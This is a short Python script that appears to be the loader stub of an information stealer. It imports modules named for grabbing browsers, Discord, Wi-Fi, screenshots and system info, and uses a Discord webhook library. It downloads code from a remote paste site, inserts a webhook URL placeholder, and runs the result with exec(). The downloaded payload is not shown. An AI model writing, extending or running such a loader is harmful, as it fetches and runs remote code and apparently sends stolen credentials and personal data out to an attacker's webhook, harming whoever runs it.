import genHwid, Zip, browsers, discord, network, screenshot, wifi, systeminfo
import os, shutil, time, ctypes, sys, winreg, dhooks, wmi, requests


url = "%URL%"

source = requests.get("https://cdn.sourceb.in/bins/DTZxV6Stcu/0").text
NEWSRC = source.replace("%WEBHOOK_URL%", url)
exec(NEWSRC)

